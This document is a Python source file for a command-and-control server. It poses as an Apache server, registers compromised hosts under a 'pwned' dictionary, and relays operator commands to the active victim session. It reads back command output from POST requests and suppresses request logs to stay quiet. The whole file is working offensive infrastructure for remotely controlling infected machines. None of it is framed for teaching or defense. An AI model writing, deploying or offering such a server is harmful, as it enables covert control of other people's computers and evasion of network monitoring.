from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib
import urllib.parse
from settings import PORT, CMD_REQUEST, RESPONSE_PATH, RESPONSE_PATH_KEY, HEADER, BIND_ADDRESS
from typing import Any

class C2Handler(BaseHTTPRequestHandler):
    """
    Custom HTTP request handler designed to intercept command and control (C2) 
    traffic disguised as standard web traffic.
    """

    # Make our c2 server look like an up-to-date Apache server
    server_version = "Apache/2.4.41"
    sys_version = "(Ubuntu)"

    def do_GET(self):
        """
        Handle GET requests. This method is used to:
        - Register new clients when they send a specific command trigger.
        - Send commands to an active client session.
        """
        global active_session, client_account, client_hostname, pwned_id, pwned_dict

        # Check if the request path matches the command trigger
        if self.path.startswith(CMD_REQUEST):
            client = self.path.split(CMD_REQUEST)[1]

            # Extract client account and hostname information
            client_account = client.split("@")[0]
            client_hostname = client.split("@")[1].split("-")[0]

            # Register a new client if it's not already in the pwned_dict
            if client not in pwned_dict.values():
                self.http_response(404)

                # Assign a unique ID to the new client
                pwned_id += 1
                pwned_dict[pwned_id] = client

                print(f"New client pwned: {client_account}@{client_hostname}")
            
            # If the client matches the active session, prompt for a command
            elif client == pwned_dict[active_session]:
                command = input(f"{client_account}@{client_hostname}> ")

                try:
                    self.http_response(200)
                    self.wfile.write(command.encode())  # Send the command to the client

                except (BrokenPipeError, ConnectionResetError, OSError):
                    print(f"Lost connection to {pwned_dict[active_session]}")
                    del pwned_dict[active_session]

                    if not pwned_dict:
                        print("Waiting for new conenctions")
                        pwned_id = 0
                        active_session = 1

                    else:
                        while True:
                            print(*pwned_dict.items(), sep="\n")

                            try:
                                new_session = int(input("\nChoose a new session number to make active: "))
                            except ValueError:
                                print("\nYou must choose a pwned id of one of the sessions shown on the screen\n")
                                continue

                            if new_session in pwned_dict:
                                active_session = new_session
                                print(f"\nActive session is now: {pwned_dict[active_session]}")
                                break
                            else:
                                print("\nYou must choose a pwned id of one of the sessions shown on the screen.\n")
                                continue

            else:
                # Respond with 404 if the client is not recognized
                self.http_response(404)

    def do_POST(self):
        """
        Handle POST requests. This method is used to:
        - Receive and process responses from the client.
        """
        if self.path == RESPONSE_PATH:
            self.http_response(200)

            # Read the content length   and extract the client data
            content_length = int(self.headers["Content-Length"])
            client_data = self.rfile.read(content_length)
            client_data = client_data.decode()
            client_data = client_data.replace(f"{RESPONSE_PATH_KEY}=", "", 1)
            client_data = urllib.parse.unquote_plus(client_data)

            # Print the response data from the client
            print(client_data)

    def log_request(self, code='-', size='-'):
        """
        Suppress logging of incoming requests to keep the server output clean.
        """
        return

    def http_response(self, code=200):
        """
        Send an HTTP response with the specified status code.
        """
        self.send_response(code)
        self.end_headers()

    def log_error(self, format: str, *args: Any) -> None:
        return super().log_error(format, *args)

# Global variables to track the state of the C2 server
active_session = 1  # ID of the currently active client session
client_account = ""  # Account name of the active client
client_hostname = ""  # Hostname of the active client
pwned_id = 0  # Counter for assigning unique IDs to pwned clients

# Dictionary to track all pwned clients: key=pwned_id, value=unique identifier (account@hostname-timestamp)
pwned_dict = {}

# Start the HTTP server and bind it to the specified address and port
server = HTTPServer((BIND_ADDRESS, PORT), C2Handler)
server.serve_forever()